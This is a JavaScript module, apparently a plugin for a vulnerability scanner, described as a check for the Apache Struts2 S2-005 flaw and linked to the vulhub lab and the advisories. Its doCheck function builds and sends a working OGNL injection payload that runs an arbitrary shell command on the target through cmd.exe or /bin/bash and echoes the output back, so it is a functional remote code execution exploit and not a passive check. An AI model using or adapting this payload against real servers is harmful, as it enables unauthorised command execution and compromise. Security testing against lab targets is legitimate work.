module.exports={
	tags:"struts2,005,ww-3470,xw-641,641,3470",
	des:"WW-3470,XW-641,struts2 005漏洞检测",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/struts2/s2-005",
		"https://github.com/vulhub/vulhub/raw/master/struts2/s2-005/S2-005.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-005",
		"https://issues.apache.org/jira/browse/WW-3470",
		"http://jira.opensymphony.com/browse/XW-641"],
	suport:g_szMyMsg,
	doCheck:function (url,fnCbk)
	{
		var _t = this;
		var s = ('%{#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
			+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]'
			+ ',#wt=#f.getWriter()'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
			// + ',#wt.flush()'
			// +',#wt.close()'
			+'}');
		var ss = s.replace(/#/gmi, "\u0023");
		ss = encodeURIComponent(ss);
		request(fnOptHeader({method: 'POST',uri: url + "?" + ss + "=1"
		    ,headers:
		    {
		    	"User-Agent": g_szUa,
		    	"Content-Type":"application/x-www-form-urlencoded"
		    }})
		  , function (error, response, body){
		  		if(body)
		  		{
		  			fnDoBody(body,"s2-005",url,null,function(o)
			    	{
			    		var r = {"url":url,"send":ss};
		  				fnCbk(global.copyO2O(r,o),_t);
			    	});
		  		}
		    }
		  );
		ss = g_postData.replace(/#/gmi, "\\43");
		request(fnOptHeader({method: 'POST',uri: url + "?s=" + ss
		    ,headers:
		    {
		    	"User-Agent": g_szUa,
		    	"Content-Type":"application/x-www-form-urlencoded"
		    }})
		  , function (error, response, body){
		  		if(body)
		  		{
		  			fnDoBody(body,"s2-005",url,null,function(o)
			    	{
			    		var r = {"url":url,"send":ss};
		  				fnCbk(global.copyO2O(r,o),_t);
			    	});
		  		}
		    }
		  );
	}
};